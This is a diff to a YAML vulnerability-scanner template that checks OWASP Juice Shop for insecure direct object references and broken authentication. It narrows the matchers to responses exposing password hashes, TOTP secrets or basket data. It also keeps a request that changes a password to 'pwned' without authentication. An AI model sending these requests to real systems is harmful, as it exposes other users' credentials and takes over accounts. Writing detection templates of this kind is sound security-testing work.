@@ -4,40 +4,30 @@ info:
   name: IDOR - Insecure Direct Object Reference
   author: hunt3r
   severity: high
-  description: Detects IDOR by accessing other users' resources via ID manipulation. Tests Juice Shop basket, orders, user profiles.
+  description: Detects IDOR by accessing other users' resources via ID manipulation. Matchers require specific sensitive fields (passwordHash, totpSecret, email+password together) to avoid FPs on legitimate read endpoints.
   tags: idor,auth-bypass,hunt3r
   reference:
     - https://portswigger.net/web-security/access-control/idor
 
 http:
+  # User data with password hash — definitive IDOR on Juice Shop /api/Users/
   - method: GET
     path:
-      - "{{BaseURL}}/rest/basket/1"
-      - "{{BaseURL}}/rest/basket/2"
-      - "{{BaseURL}}/rest/basket/3"
+      - "{{BaseURL}}/api/Users/1"
       - "{{BaseURL}}/api/Users/2"
       - "{{BaseURL}}/api/Users/3"
-      - "{{BaseURL}}/rest/memories/1"
-      - "{{BaseURL}}/rest/memories/2"
-      - "{{BaseURL}}/profile?id=1"
-      - "{{BaseURL}}/profile?id=2"
-      - "{{BaseURL}}/account?user=1"
-      - "{{BaseURL}}/account?user=2"
-      - "{{BaseURL}}/orders/1"
-      - "{{BaseURL}}/orders/2"
 
     matchers-condition: and
     matchers:
       - type: status
         status: [200]
 
-      - type: word
+      - type: regex
         part: body
-        words:
-          - "\"id\""
-          - "\"email\""
-          - "\"username\""
-          - "\"data\""
+        regex:
+          - "\"password\"\\s*:"
+          - "\"passwordHash\"\\s*:"
+          - "\"totpSecret\"\\s*:"
         condition: or
 
       - type: word
@@ -45,17 +35,46 @@ http:
         words:
           - "application/json"
 
+  # Basket access without auth — another Juice Shop IDOR
   - method: GET
     path:
-      - "{{BaseURL}}/rest/user/change-password?current=&new=pwned&repeat=pwned"
-      - "{{BaseURL}}/rest/user/change-password?new=pwned&repeat=pwned"
+      - "{{BaseURL}}/rest/basket/1"
+      - "{{BaseURL}}/rest/basket/2"
 
     matchers-condition: and
     matchers:
       - type: status
         status: [200]
 
+      - type: regex
+        part: body
+        # Must contain Products array AND a UserId field to confirm actual basket data
+        regex:
+          - "\"Products\"\\s*:\\s*\\["
+          - "\"UserId\"\\s*:\\s*[0-9]+"
+        condition: and
+
+  # Unauthenticated password change (broken auth, not just IDOR)
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/user/change-password?current=&new=pwned&repeat=pwned"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "\"message\"\\s*:\\s*\"password changed\""
+          - "\"success\"\\s*:\\s*true"
+        condition: or
+
       - type: word
         part: body
+        negative: true
         words:
-          - "password"
+          - "Unauthorized"
+          - "must provide"
+          - "token"
